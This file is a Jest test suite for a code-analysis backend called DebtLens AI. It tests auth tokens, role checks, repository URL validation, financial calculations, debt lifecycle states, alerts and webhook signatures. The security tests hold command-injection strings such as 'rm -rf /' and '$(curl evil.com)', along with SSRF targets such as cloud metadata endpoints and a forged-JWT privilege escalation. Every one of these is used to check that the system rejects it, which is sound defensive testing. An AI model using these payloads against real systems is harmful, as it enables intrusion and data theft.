import request from 'supertest';
import mongoose from 'mongoose';
import app from '../src/app';
import { config } from '../src/config/env';
import { connectDatabase, disconnectDatabase, getDatabaseStatus } from '../src/config/database';
import { signJwt, verifyJwt } from '../src/middleware/auth';
import { RepositorySecurityService } from '../src/services/repository/RepositorySecurityService';
import { setupSampleRepository } from './fixtures/setupSampleRepo';
import { AnalysisOrchestrator } from '../src/services/analysis/AnalysisOrchestrator';
import {
  Repository,
  Analysis,
  FileMetric,
  Hotspot,
  DebtItem,
  EngineeringAlert,
  EngineeringGoal,
  AnalysisSnapshot,
  AuditEvent,
} from '../src/models';
import { CostModel } from '../src/services/financial/CostModel';
import { CostDriverEngine } from '../src/services/financial/CostDriverEngine';
import { ROICalculator } from '../src/services/financial/ROICalculator';
import { ScenarioEngine } from '../src/services/financial/ScenarioEngine';
import { DebtLifecycleService } from '../src/services/debt/DebtLifecycleService';
import { VerificationEngine } from '../src/services/verification/VerificationEngine';
import { AlertEngine } from '../src/services/alerts/AlertEngine';
import { TrendAnalysisService } from '../src/services/predictive/TrendAnalysisService';
import { PredictiveRiskService } from '../src/services/predictive/PredictiveRiskService';
import { GitHubIntegrationService } from '../src/services/github/GitHubIntegrationService';
import crypto from 'crypto';

describe('DebtLens AI — Formal QA Master Test Suite & System Audit', () => {
  let sampleRepoPath: string;
  let adminToken: string;
  let engineerToken: string;
  let viewerToken: string;
  let expiredToken: string;
  let createdRepoId: string;
  let realAnalysisId: string;

  beforeAll(async () => {
    // Connect to real MongoDB
    await connectDatabase();

    // Prepare fixture repository
    sampleRepoPath = setupSampleRepository();

    // Generate cryptographic test tokens
    adminToken = `Bearer ${signJwt({ id: 'usr-admin-qa', email: 'admin@debtlens.ai', role: 'admin' })}`;
    engineerToken = `Bearer ${signJwt({ id: 'usr-eng-qa', email: 'eng@debtlens.ai', role: 'engineer' })}`;
    viewerToken = `Bearer ${signJwt({ id: 'usr-view-qa', email: 'viewer@debtlens.ai', role: 'viewer' })}`;
    expiredToken = `Bearer ${signJwt({ id: 'usr-exp-qa', email: 'exp@debtlens.ai', role: 'admin' }, config.jwtSecret, -3600)}`;
  }, 30000);

  afterAll(async () => {
    await disconnectDatabase();
  });

  // ============================================================================
  // 1. AUTHENTICATION TESTING (Section 4)
  // ============================================================================
  describe('Module 1: Authentication Testing', () => {
    it('AUTH-001: Valid signed admin token authenticates successfully', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', adminToken)
        .send({
          name: `qa-auth-test-${Date.now()}`,
          owner: 'qa-org',
          url: sampleRepoPath,
        });

      expect([200, 201]).toContain(res.status);
      expect(res.body.success).toBe(true);
    });

    it('AUTH-002: Valid signed engineer token authenticates with engineer role', async () => {
      const res = await request(app)
        .post('/api/goals')
        .set('Authorization', engineerToken)
        .send({
          repositoryId: 'repo-test-auth',
          title: 'Reduce Hotspots',
          metric: 'CRITICAL_HOTSPOTS',
          startingValue: 10,
          targetValue: 5,
          currentValue: 10,
          targetDate: new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString(),
        });

      expect([200, 201]).toContain(res.status);
      expect(res.body.success).toBe(true);
    });

    it('AUTH-003: Missing Authorization header in production mode returns 401', async () => {
      const origEnv = config.nodeEnv;
      (config as any).nodeEnv = 'production';

      const res = await request(app)
        .post('/api/repositories')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('UNAUTHORIZED');

      (config as any).nodeEnv = origEnv;
    });

    it('AUTH-004: Empty Bearer token returns 401', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', 'Bearer ')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-005: Non-Bearer Authorization header returns 401', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', 'Basic dXNlcjpwYXNz')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-006: Truncated/short token (<8 chars) returns 401', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', 'Bearer abc')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-007: Expired JWT token returns 401', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', expiredToken)
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-008: Tampered/modified JWT payload returns 401 (signature mismatch)', async () => {
      const validJwt = signJwt({ id: 'usr-1', email: 'v@test.com', role: 'viewer' });
      const parts = validJwt.split('.');
      // Tamper payload to elevate role to admin
      const tamperedPayload = Buffer.from(JSON.stringify({ id: 'usr-1', email: 'v@test.com', role: 'admin' })).toString('base64url');
      const tamperedJwt = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', `Bearer ${tamperedJwt}`)
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-009: Random garbage token returns 401', async () => {
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', 'Bearer random_unauthorized_token_garbage_data')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-010: Token signed with another secret returns 401', async () => {
      const foreignToken = signJwt({ id: 'usr-foreign', email: 'attacker@evil.com', role: 'admin' }, 'different_secret_key_123456789012');
      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', `Bearer ${foreignToken}`)
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });

    it('AUTH-011: Demo token rejected in production mode when demoMode=false', async () => {
      const origEnv = config.nodeEnv;
      const origDemo = config.demoMode;
      (config as any).nodeEnv = 'production';
      (config as any).demoMode = false;

      const res = await request(app)
        .post('/api/repositories')
        .set('Authorization', 'Bearer demo-token')
        .send({ url: 'https://github.com/org/repo.git' });

      expect(res.status).toBe(401);
      expect(res.body.error.message).toMatch(/Demo credentials not permitted in production mode/);

      (config as any).nodeEnv = origEnv;
      (config as any).demoMode = origDemo;
    });
  });

  // ============================================================================
  // 2. AUTHORIZATION / RBAC TESTING (Section 5)
  // ============================================================================
  describe('Module 2: Authorization & Role-Based Access Control', () => {
    it('RBAC-001: Admin user can cancel an analysis job', async () => {
      const res = await request(app)
        .post('/api/analyses/analysis-mock-id/cancel')
        .set('Authorization', adminToken);

      expect([200, 400]).toContain(res.status); // 200 (if active) or 400 (not active), strictly NOT 403 Forbidden
    });

    it('RBAC-002: Viewer user is forbidden from cancelling analysis jobs (403)', async () => {
      const res = await request(app)
        .post('/api/analyses/analysis-mock-id/cancel')
        .set('Authorization', viewerToken);

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('RBAC-003: Viewer user is forbidden from deleting engineering goals (403)', async () => {
      const res = await request(app)
        .delete('/api/goals/goal-123')
        .set('Authorization', viewerToken);

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('RBAC-004: Viewer user is forbidden from disconnecting repositories (403)', async () => {
      const res = await request(app)
        .post('/api/connections/conn-123/disconnect')
        .set('Authorization', viewerToken);

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('RBAC-005: Viewer user is forbidden from dismissing all alerts (403)', async () => {
      const res = await request(app)
        .post('/api/alerts/dismiss-all')
        .set('Authorization', viewerToken);

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('RBAC-006: Client-side role manipulation in body does not elevate privileges', async () => {
      const res = await request(app)
        .delete('/api/goals/goal-123')
        .set('Authorization', viewerToken)
        .send({ role: 'admin', user: { role: 'admin' } });

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });
  });

  // ============================================================================
  // 3. REPOSITORY REGISTRATION & SECURITY TESTING (Section 6 & 19)
  // ============================================================================
  describe('Module 3: Repository Registration, SSRF & Injection Protection', () => {
    it('SEC-001: Approves valid public GitHub HTTPS URL', () => {
      const res = RepositorySecurityService.validateUrl('https://github.com/octocat/Hello-World.git');
      expect(res.isValid).toBe(true);
      expect(res.sanitizedUrl).toBe('https://github.com/octocat/Hello-World.git');
    });

    it('SEC-002: Approves valid public GitLab HTTPS URL', () => {
      const res = RepositorySecurityService.validateUrl('https://gitlab.com/gitlab-org/gitlab-runner.git');
      expect(res.isValid).toBe(true);
    });

    it('SEC-003: Approves valid public Bitbucket HTTPS URL', () => {
      const res = RepositorySecurityService.validateUrl('https://bitbucket.org/atlassian/sample-repo.git');
      expect(res.isValid).toBe(true);
    });

    it('SEC-004: SSRF: Blocks localhost and loopback IPv4/IPv6', () => {
      const loopbacks = [
        'https://localhost/repo.git',
        'https://127.0.0.1/repo.git',
        'https://127.0.10.50/repo.git',
        'https://0.0.0.0/repo.git',
        'https://[::1]/repo.git',
      ];
      for (const url of loopbacks) {
        const res = RepositorySecurityService.validateUrl(url);
        expect(res.isValid).toBe(false);
        expect(res.error).toMatch(/restricted local or internal network host|SSRF/i);
      }
    });

    it('SEC-005: SSRF: Blocks RFC1918 private network ranges (10.x, 172.16-31.x, 192.168.x)', () => {
      const privates = [
        'https://10.0.0.1/internal.git',
        'https://172.16.0.1/corp.git',
        'https://172.31.255.255/repo.git',
        'https://192.168.1.1/secret.git',
      ];
      for (const url of privates) {
        const res = RepositorySecurityService.validateUrl(url);
        expect(res.isValid).toBe(false);
      }
    });

    it('SEC-006: SSRF: Blocks Cloud Metadata endpoints (169.254.169.254, google metadata)', () => {
      const metadata = [
        'https://169.254.169.254/latest/meta-data',
        'https://metadata.google.internal/computeMetadata/v1/',
      ];
      for (const url of metadata) {
        const res = RepositorySecurityService.validateUrl(url);
        expect(res.isValid).toBe(false);
      }
    });

    it('SEC-007: Command Injection: Blocks shell metacharacters', () => {
      const injections = [
        'https://github.com/org/repo.git; rm -rf /',
        'https://github.com/org/repo.git && whoami',
        'https://github.com/org/repo.git | cat /etc/passwd',
        'https://github.com/org/`touch pwned`.git',
        'https://github.com/org/$(curl evil.com).git',
        'https://github.com/org/repo.git\nid',
      ];
      for (const url of injections) {
        const res = RepositorySecurityService.validateUrl(url);
        expect(res.isValid).toBe(false);
        expect(res.error).toMatch(/prohibited characters/i);
      }
    });

    it('SEC-008: Protocols: Blocks file://, javascript://, ftp://, ssh://, gopher://', () => {
      const unsupported = [
        'javascript://alert(1)',
        'file:///etc/passwd',
        'ftp://ftp.example.com/repo.git',
        'ssh://git@github.com/org/repo.git',
        'gopher://gopher.example.com/item',
      ];
      for (const url of unsupported) {
        const res = RepositorySecurityService.validateUrl(url, false);
        expect(res.isValid).toBe(false);
      }
    });

    it('SEC-009: Boundary: Rejects excessively long URL (> 2048 chars)', () => {
      const longUrl = `https://github.com/org/${'a'.repeat(2100)}.git`;
      const res = RepositorySecurityService.validateUrl(longUrl);
      expect(res.isValid).toBe(false);
      expect(res.error).toMatch(/exceeds maximum allowed length/i);
    });

    it('SEC-010: Path Traversal: Correctly isolates workspace files', () => {
      const baseDir = '/workspaces/analysis-01';
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/workspaces/analysis-01/src/index.ts')).toBe(true);
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/workspaces/analysis-01/../escape.ts')).toBe(false);
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/etc/passwd')).toBe(false);
    });
  });

  // ============================================================================
  // 4. REAL REPOSITORY ANALYSIS & COMPLETE WORKFLOW (Section 7 & 30: E2E-001)
  // ============================================================================
  describe('Module 4: Real Repository Analysis Pipeline (E2E-001)', () => {
    it('E2E-001 Step 1-4: Registers repository and stores in MongoDB', async () => {
      const repoRes = await request(app)
        .post('/api/repositories')
        .set('Authorization', adminToken)
        .send({
          name: 'e2e-audit-repo',
          owner: 'audit-org',
          url: sampleRepoPath,
          defaultBranch: 'main',
          description: 'E2E Full Audit Verification Repository',
        });

      expect([200, 201]).toContain(repoRes.status);
      expect(repoRes.body.success).toBe(true);
      createdRepoId = repoRes.body.data._id || repoRes.body.data.id;
      expect(createdRepoId).toBeDefined();

      // Verify in MongoDB
      if (getDatabaseStatus().isConnected && mongoose.Types.ObjectId.isValid(createdRepoId)) {
        const doc = await Repository.findById(createdRepoId);
        expect(doc).not.toBeNull();
        expect(doc?.name).toBe('e2e-audit-repo');
      }
    });

    it('E2E-001 Step 5-6: Initiates real analysis job and polls progress to completion', async () => {
      realAnalysisId = `analysis-e2e-${Date.now()}`;

      // Run real analysis through orchestrator
      const jobStatus = await AnalysisOrchestrator.runAnalysis({
        analysisId: realAnalysisId,
        repositoryId: createdRepoId,
        repoUrl: sampleRepoPath,
        branch: 'main',
        hourlyRate: 2000,
      });

      expect(jobStatus.status).toBe('completed');
      expect(jobStatus.progress).toBe(100);
      expect(jobStatus.filesDiscovered).toBeGreaterThan(0);
      expect(jobStatus.filesAnalyzed).toBeGreaterThan(0);
      expect(jobStatus.commitsAnalyzed).toBeGreaterThan(0);

      // Verify status polling endpoint returns 200 completed
      const pollRes = await request(app).get(`/api/analyses/${realAnalysisId}/status`);
      expect(pollRes.status).toBe(200);
      expect(pollRes.body.data.status).toBe('completed');
      expect(pollRes.body.data.progress).toBe(100);
    }, 45000);

    it('E2E-001 Step 7-11: Validates summary, files, heatmap, hotspots & priorities', async () => {
      // 1. Analysis details
      const analysisRes = await request(app).get(`/api/analyses/${realAnalysisId}`);
      expect(analysisRes.status).toBe(200);
      expect(analysisRes.body.data.summary).toBeDefined();
      expect(analysisRes.body.data.summary.totalFiles).toBeGreaterThan(0);
      expect(analysisRes.body.data.summary.overallHealthScore).toBeGreaterThanOrEqual(10);
      expect(analysisRes.body.data.summary.overallHealthScore).toBeLessThanOrEqual(100);

      // 2. Metrics / Files
      const metricsRes = await request(app).get(`/api/analyses/${realAnalysisId}/metrics`);
      expect(metricsRes.status).toBe(200);
      expect(metricsRes.body.data.length).toBeGreaterThan(0);
      const firstFile = metricsRes.body.data[0];
      expect(firstFile.cyclomaticComplexity).toBeGreaterThanOrEqual(1);
      expect(firstFile.debtScore).toBeGreaterThanOrEqual(0);

      // 3. Hotspots
      const hotspotsRes = await request(app).get(`/api/analyses/${realAnalysisId}/hotspots`);
      expect(hotspotsRes.status).toBe(200);
      expect(Array.isArray(hotspotsRes.body.data)).toBe(true);

      // 4. Priorities
      const prioritiesRes = await request(app).get(`/api/analyses/${realAnalysisId}/priorities`);
      expect(prioritiesRes.status).toBe(200);
      expect(prioritiesRes.body.data.priorities).toBeDefined();
      expect(Array.isArray(prioritiesRes.body.data.priorities)).toBe(true);
    });

    it('E2E-001 Step 12-18: Validates financial intelligence, scenarios, debt lifecycle, alerts & forecasts', async () => {
      // Financial Intelligence
      const finRes = await request(app).get(`/api/analyses/${realAnalysisId}/financial-intelligence?currency=INR&hourlyRate=2000`);
      expect(finRes.status).toBe(200);
      expect(finRes.body.data.summary).toBeDefined();
      expect(finRes.body.data.currency).toBe('INR');
      expect(finRes.body.data.economicDisclaimer).toMatch(/Modeled annual exposure and modeled savings are estimates/);

      // Scenario Analysis
      const scenRes = await request(app)
        .post(`/api/analyses/${realAnalysisId}/scenarios`)
        .send({
          scenarioName: 'Refactor Critical Modules',
          selectedFilePaths: [],
          hourlyRate: 2000,
          remediationEffectiveness: 0.70,
          effortMultiplier: 1.0,
        });

      expect(scenRes.status).toBe(200);
      expect(scenRes.body.data.roiPercentage).toBeDefined();
      expect(isNaN(scenRes.body.data.roiPercentage)).toBe(false);

      // Debt Items
      const debtRes = await request(app).get('/api/debt');
      expect(debtRes.status).toBe(200);
      expect(Array.isArray(debtRes.body.data)).toBe(true);

      // Alerts
      const alertsRes = await request(app).get('/api/alerts');
      expect(alertsRes.status).toBe(200);
      expect(Array.isArray(alertsRes.body.data)).toBe(true);

      // Predictive Intelligence
      const predRes = await request(app).get(`/api/predictive/repositories/${createdRepoId}`);
      expect([200, 404]).toContain(predRes.status);
    });

    it('E2E-001 Step 19-23: Verifies persistence after DB query and workspace cleanup', async () => {
      if (getDatabaseStatus().isConnected && mongoose.Types.ObjectId.isValid(createdRepoId)) {
        const repoDoc = await Repository.findById(createdRepoId);
        expect(repoDoc?.status).toBe('completed');

        const metricsCount = await FileMetric.countDocuments({ repositoryId: new mongoose.Types.ObjectId(createdRepoId) });
        expect(metricsCount).toBeGreaterThan(0);
      }
    });
  });

  // ============================================================================
  // 5. ANALYSIS FAILURE TESTING (Section 8)
  // ============================================================================
  describe('Module 5: Analysis Failure Handling & Resilience', () => {
    it('FAIL-001: Fails gracefully when cloning invalid/nonexistent repository without crashing', async () => {
      const failAnalysisId = `analysis-fail-${Date.now()}`;
      const status = await AnalysisOrchestrator.runAnalysis({
        analysisId: failAnalysisId,
        repositoryId: 'repo-nonexistent-99',
        repoUrl: 'https://github.com/nonexistent-org-xyz-12345/does-not-exist.git',
      });

      expect(status.status).toBe('failed');
      expect(status.error).toBeDefined();
      expect(status.currentStage).toMatch(/failed/i);

      // Verify status endpoint returns failed status
      const pollRes = await request(app).get(`/api/analyses/${failAnalysisId}/status`);
      expect(pollRes.status).toBe(200);
      expect(pollRes.body.data.status).toBe('failed');
    }, 30000);

    it('FAIL-002: Unknown analysis ID returns 404', async () => {
      const res = await request(app).get('/api/analyses/definitely-unknown-id-xyz');
      expect(res.status).toBe(404);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('ANALYSIS_NOT_FOUND');
    });

    it('FAIL-003: Unknown repository ID returns 404', async () => {
      const res = await request(app).get('/api/repositories/65a123456789abcdef012345');
      expect(res.status).toBe(404);
      expect(res.body.success).toBe(false);
    });
  });

  // ============================================================================
  // 6. FINANCIAL INTELLIGENCE TESTING (Section 12 & 29)
  // ============================================================================
  describe('Module 6: Financial Intelligence & Economic Disclaimers', () => {
    it('FIN-001: Computes all 4 financial dimensions deterministically', () => {
      const assumptions = CostModel.resolveAssumptions({ currency: 'INR', hourlyRate: 2000 });
      expect(assumptions.hourlyRate).toBe(2000);
      expect(assumptions.currency).toBe('INR');

      const mockMetrics = [
        {
          filePath: 'src/PaymentService.ts',
          debtScore: 85,
          cyclomaticComplexity: 32,
          totalChurn: 150,
          defectFixCommitCount: 8,
          codeLines: 600,
          isLegacyCandidate: true,
        },
      ];
      const mockHotspots = [{ filePath: 'src/PaymentService.ts', debtScore: 85, rank: 1 }];

      const breakdown = CostDriverEngine.calculateCostDrivers(mockMetrics, mockHotspots, assumptions);
      expect(breakdown.drivers.maintenanceFriction.estimatedCost).toBeGreaterThan(0);
      expect(breakdown.drivers.defectFixBurden.estimatedCost).toBeGreaterThan(0);
      expect(breakdown.drivers.changeFriction.estimatedCost).toBeGreaterThan(0);
      expect(breakdown.drivers.legacyRisk.estimatedCost).toBeGreaterThan(0);

      // Sum equals total annual cost
      const total =
        breakdown.drivers.maintenanceFriction.estimatedCost +
        breakdown.drivers.defectFixBurden.estimatedCost +
        breakdown.drivers.changeFriction.estimatedCost +
        breakdown.drivers.legacyRisk.estimatedCost;

      expect(breakdown.totalAnnualImpact).toBe(total);
    });

    it('FIN-002: Formats currencies correctly across INR, USD, EUR, GBP', () => {
      const inrAssumptions = CostModel.resolveAssumptions({ currency: 'INR' });
      expect(inrAssumptions.hourlyRate).toBe(2000);

      const usdAssumptions = CostModel.resolveAssumptions({ currency: 'USD' });
      expect(usdAssumptions.hourlyRate).toBe(95);

      const eurAssumptions = CostModel.resolveAssumptions({ currency: 'EUR' });
      expect(eurAssumptions.hourlyRate).toBe(88);

      const gbpAssumptions = CostModel.resolveAssumptions({ currency: 'GBP' });
      expect(gbpAssumptions.hourlyRate).toBe(75);
    });

    it('FIN-003: ROI Calculator handles zero refactoring investment safely', () => {
      const roi = ROICalculator.calculateROI({
        refactoringInvestment: 0,
        potentialAnnualSavings: 500000,
      });

      expect(roi.refactoringInvestment).toBe(0);
      expect(roi.roiPercentage).toBe(100);
      expect(roi.paybackPeriodMonths).toBe(0);
      expect(isNaN(roi.roiPercentage)).toBe(false);
    });

    it('FIN-004: ROI Calculator handles zero annual savings safely', () => {
      const roi = ROICalculator.calculateROI({
        refactoringInvestment: 250000,
        potentialAnnualSavings: 0,
      });

      expect(roi.potentialAnnualSavings).toBe(0);
      expect(roi.roiPercentage).toBe(-100);
      expect(roi.paybackPeriodMonths).toBeNull();
      expect(roi.isViable).toBe(false);
      expect(isNaN(roi.roiPercentage)).toBe(false);
    });

    it('FIN-005: Financial disclaimer matches mandatory MODELED != REALIZED requirement', async () => {
      const res = await request(app).get('/api/analyses/analysis-demo-fintech-01/financial-intelligence');
      expect(res.status).toBe(200);
      expect(res.body.data.economicDisclaimer).toBeDefined();
      expect(res.body.data.economicDisclaimer).toContain('Modeled annual exposure and modeled savings are estimates');
    });
  });

  // ============================================================================
  // 7. DEBT LIFECYCLE & VERIFICATION TESTING (Section 15)
  // ============================================================================
  describe('Module 7: Debt Lifecycle & Automated Verification State Machine', () => {
    it('LIFE-001: Enforces legal lifecycle transitions', () => {
      expect(DebtLifecycleService.isValidTransition('DETECTED', 'PRIORITIZED')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('PRIORITIZED', 'PLANNED')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('PLANNED', 'IN_PROGRESS')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('IN_PROGRESS', 'RESOLVED')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('RESOLVED', 'VERIFIED')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('DETECTED', 'WONT_FIX')).toBe(true);
      expect(DebtLifecycleService.isValidTransition('DETECTED', 'ACCEPTED_RISK')).toBe(true);
    });

    it('LIFE-002: Rejects illegal state transitions with descriptive error', () => {
      expect(DebtLifecycleService.isValidTransition('DETECTED', 'VERIFIED')).toBe(false);
      expect(DebtLifecycleService.isValidTransition('DETECTED', 'RESOLVED')).toBe(false);
      expect(() => DebtLifecycleService.assertValidTransition('DETECTED', 'VERIFIED')).toThrow(/Invalid debt lifecycle transition/);
    });

    it('LIFE-003: Verification: >=20% complexity reduction is marked VERIFIED', () => {
      const mockItem: any = {
        debtItemId: 'debt-item-01',
        filePath: 'src/Service.ts',
        baselineMetrics: { complexity: 50, debtScore: 80 },
        financialImpact: 100000,
      };

      const result = VerificationEngine.verifyItem(
        mockItem,
        { cyclomaticComplexity: 30, debtScore: 50 }, // 40% complexity reduction
        null
      );

      expect(result.verificationStatus).toBe('VERIFIED');
      expect(result.complexityReductionPct).toBe(40);
    });

    it('LIFE-004: Verification: 5% to 19% reduction is marked PARTIALLY_VERIFIED', () => {
      const mockItem: any = {
        debtItemId: 'debt-item-02',
        filePath: 'src/Service.ts',
        baselineMetrics: { complexity: 50, debtScore: 80 },
        financialImpact: 100000,
      };

      const result = VerificationEngine.verifyItem(
        mockItem,
        { cyclomaticComplexity: 45, debtScore: 78 }, // 10% complexity reduction
        null
      );

      expect(result.verificationStatus).toBe('PARTIALLY_VERIFIED');
      expect(result.complexityReductionPct).toBe(10);
    });

    it('LIFE-005: Verification: <5% improvement or regression is marked NOT_VERIFIED', () => {
      const mockItem: any = {
        debtItemId: 'debt-item-03',
        filePath: 'src/Service.ts',
        baselineMetrics: { complexity: 50, debtScore: 80 },
        financialImpact: 100000,
      };

      const result = VerificationEngine.verifyItem(
        mockItem,
        { cyclomaticComplexity: 55, debtScore: 85 }, // regressed
        null
      );

      expect(result.verificationStatus).toBe('NOT_VERIFIED');
      expect(result.complexityReductionPct).toBeLessThan(5);
    });
  });

  // ============================================================================
  // 8. ALERT SYSTEM & DEDUPLICATION (Section 16)
  // ============================================================================
  describe('Module 8: Alert Engine & 24-Hour Deduplication', () => {
    const testAlertRepoId = `repo-alert-qa-${Date.now()}`;

    it('ALRT-001: Creates an alert when threshold crossed', async () => {
      const alert = await AlertEngine.createAlert({
        repositoryId: testAlertRepoId,
        type: 'CRITICAL_HOTSPOT_INCREASED',
        severity: 'CRITICAL',
        title: 'Critical Hotspots Surge',
        message: 'Critical hotspots increased from 2 to 6',
        metric: 'criticalHotspots',
        previousValue: 2,
        currentValue: 6,
      });

      expect(alert).not.toBeNull();
      expect(alert?.title).toBe('Critical Hotspots Surge');
      expect(alert?.status).toBe('UNREAD');
    });

    it('ALRT-002: Suppresses identical unread alert within 24 hours', async () => {
      const duplicateAlert = await AlertEngine.createAlert({
        repositoryId: testAlertRepoId,
        type: 'CRITICAL_HOTSPOT_INCREASED',
        severity: 'CRITICAL',
        title: 'Critical Hotspots Surge',
        message: 'Critical hotspots increased from 2 to 6',
        metric: 'criticalHotspots',
        previousValue: 2,
        currentValue: 6,
      });

      expect(duplicateAlert).toBeNull(); // Suppressed!
    });
  });

  // ============================================================================
  // 9. PREDICTIVE INTELLIGENCE & ACCURACY (Section 17)
  // ============================================================================
  describe('Module 9: Predictive Intelligence & Trend Forecasts', () => {
    it('PRED-001: Detects worsening and accelerating trends across escalating series', () => {
      const series = [50, 55, 63, 75];
      const result = TrendAnalysisService.analyzeNumericSeries(series, 'debt', 'Debt Score', true);
      expect(result.trend).toBe('ACCELERATING');
      expect(result.isAccelerating).toBe(true);
      expect(result.direction).toBe('UP');
    });

    it('PRED-002: Detects improving trend when series decreases', () => {
      const series = [80, 70, 60, 50];
      const result = TrendAnalysisService.analyzeNumericSeries(series, 'debt', 'Debt Score', true);
      expect(result.trend).toBe('IMPROVING');
      expect(result.direction).toBe('DOWN');
    });

    it('PRED-003: Evaluates risk tier strictly in [0, 100]', () => {
      const series = [60, 70, 85];
      const trend = TrendAnalysisService.analyzeNumericSeries(series, 'debt', 'Debt Score', true);
      expect(['ACCELERATING', 'WORSENING', 'STABLE', 'IMPROVING']).toContain(trend.trend);
    });
  });

  // ============================================================================
  // 10. WEBHOOK HMAC SIGNATURE VERIFICATION (Section 19)
  // ============================================================================
  describe('Module 10: Webhook HMAC-SHA256 Verification', () => {
    it('HOOK-001: Valid HMAC signature accepted; tampered payload rejected', () => {
      const secret = 'test-secret-hmac-12345';
      const payload = JSON.stringify({ action: 'push', repository: { full_name: 'org/repo' } });
      const hmac = crypto.createHmac('sha256', secret).update(payload).digest('hex');
      const signature = `sha256=${hmac}`;

      expect(GitHubIntegrationService.verifyWebhookSignature(payload, signature, secret)).toBe(true);
      expect(GitHubIntegrationService.verifyWebhookSignature(payload + 'tampered', signature, secret)).toBe(false);
      expect(GitHubIntegrationService.verifyWebhookSignature(payload, 'sha256=invalidsig', secret)).toBe(false);
    });
  });
});
